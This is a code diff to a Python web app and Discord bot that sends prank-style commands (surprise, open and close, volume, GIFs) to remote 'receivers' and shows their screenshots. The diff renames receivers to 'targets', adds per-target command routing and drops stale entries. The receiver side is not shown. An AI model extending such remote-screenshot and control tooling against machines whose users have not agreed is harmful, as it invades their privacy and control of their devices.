@@ -50,6 +50,7 @@ _latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
 STATE_FILE = ROOT_DIR / "receivers.json"
 _receivers: dict[str, dict] = {}  # id -> {"name": str, "last_seen": float, "tag": str}
 _selected_receiver: Optional[str] = None
+STALE_SECONDS = 90
 
 def _load_state():
     global _receivers, _selected_receiver
@@ -66,6 +67,22 @@ def _save_state():
         STATE_FILE.write_text(json.dumps({"receivers": _receivers, "selected": _selected_receiver}))
     except Exception:
         pass
+
+def _prune_receivers(now: Optional[float] = None) -> bool:
+    global _selected_receiver
+    if now is None:
+        now = time.time()
+    removed = False
+    for rid in list(_receivers.keys()):
+        last_seen = _receivers[rid].get("last_seen", 0)
+        if now - last_seen > STALE_SECONDS:
+            _receivers.pop(rid, None)
+            removed = True
+            if _selected_receiver == rid:
+                _selected_receiver = None
+    if removed:
+        _save_state()
+    return removed
 
 _load_state()
 
@@ -110,6 +127,7 @@ async def on_message(message: discord.Message):
             tag = tokens[2].strip()
             now = time.time()
             entry = _receivers.get(receiver_id, {"name": tag, "tag": tag, "last_seen": now})
+            entry["name"] = tag
             entry["tag"] = tag
             entry["last_seen"] = now
             _receivers[receiver_id] = entry
@@ -182,7 +200,7 @@ CONTROL_HTML = """<!doctype html>
     <div class="card">
       <div class="tabs">
         <button class="tab-btn active" data-tab="surprise">Surprise</button>
-        <button class="tab-btn" data-tab="select">Receivers</button>
+        <button class="tab-btn" data-tab="select">Select Target</button>
         <button class="tab-btn" data-tab="openclose">Open & Close :3</button>
         <button class="tab-btn" data-tab="volume">Volume ;0</button>
       </div>
@@ -199,10 +217,8 @@ CONTROL_HTML = """<!doctype html>
         </div>
       </div>
       <div class="tab-pane" data-tab="select">
-        <h1>Select Receiver</h1>
+        <h1>Select Target</h1>
         <div id="receiver-buttons" class="row" style="flex-wrap: wrap;"></div>
-        <div style="margin-top:10px; font-size:13px; color:var(--muted);">Offline</div>
-        <div id="receiver-offline" class="row" style="flex-wrap: wrap;"></div>
       </div>
       <div class="tab-pane" data-tab="openclose">
         <h1>Open & Close :3</h1>
@@ -249,34 +265,20 @@ CONTROL_HTML = """<!doctype html>
         if (!res.ok) return;
         const data = await res.json();
         const wrap = document.getElementById('receiver-buttons');
-        const offlineWrap = document.getElementById('receiver-offline');
         wrap.innerHTML = '';
-        offlineWrap.innerHTML = '';
         (data.online || []).forEach(rec => {
           const form = document.createElement('form');
           form.method = 'post';
           form.action = '/ui/select/' + encodeURIComponent(rec.id);
           const btn = document.createElement('button');
           btn.type = 'submit';
-          btn.textContent = rec.name || rec.tag;
+          btn.textContent = rec.tag;
           if (data.selected === rec.id) {
             btn.style.background = '#10b981';
             btn.style.color = '#0b1224';
           }
           form.appendChild(btn);
           wrap.appendChild(form);
-        });
-        (data.offline || []).forEach(rec => {
-          const form = document.createElement('form');
-          form.method = 'post';
-          form.action = '/ui/select/' + encodeURIComponent(rec.id);
-          const btn = document.createElement('button');
-          btn.type = 'submit';
-          btn.textContent = rec.name || rec.tag;
-          btn.style.background = '#475569';
-          btn.style.color = '#e2e8f0';
-          form.appendChild(btn);
-          offlineWrap.appendChild(form);
         });
       } catch (e) { /* ignore */ }
     }
@@ -374,9 +376,11 @@ async def _wait_controller_ready(timeout: float = 5.0) -> bool:
         return False
 
 def _cmd_with_selection(cmd: str, *args: str) -> str:
-    # Broadcast to all receivers: no tag/selection
     parts = [cmd, *args]
-    return " ".join(parts)
+    base = " ".join(parts)
+    if _selected_receiver:
+        return f"TARGET {_selected_receiver} {base}"
+    return f"TARGET NONE {base}"
 
 @app.post("/cmd/gif/start")
 async def gif_start():
@@ -399,15 +403,12 @@ async def api_screenshot():
 @app.get("/api/receivers")
 async def api_receivers():
     now = time.time()
+    _prune_receivers(now)
     online = []
-    offline = []
     for rid, info in _receivers.items():
-        data = {"id": rid, "name": info.get("name") or info.get("tag"), "tag": info.get("tag"), "last_seen": info.get("last_seen", 0)}
-        if now - data["last_seen"] <= 120:
-            online.append(data)
-        else:
-            offline.append(data)
-    return JSONResponse({"online": online, "offline": offline, "selected": _selected_receiver})
+        data = {"id": rid, "name": info.get("tag"), "tag": info.get("tag"), "last_seen": info.get("last_seen", 0)}
+        online.append(data)
+    return JSONResponse({"online": online, "offline": [], "selected": _selected_receiver})
 
 @app.post("/ui/surprise")
 async def ui_surprise():
@@ -501,6 +502,7 @@ async def ui_volume(request: Request):
 @app.post("/ui/select/{tag}")
 async def ui_select(tag: str):
     global _selected_receiver
+    _prune_receivers()
     if tag in _receivers:
         _selected_receiver = tag
         _save_state()
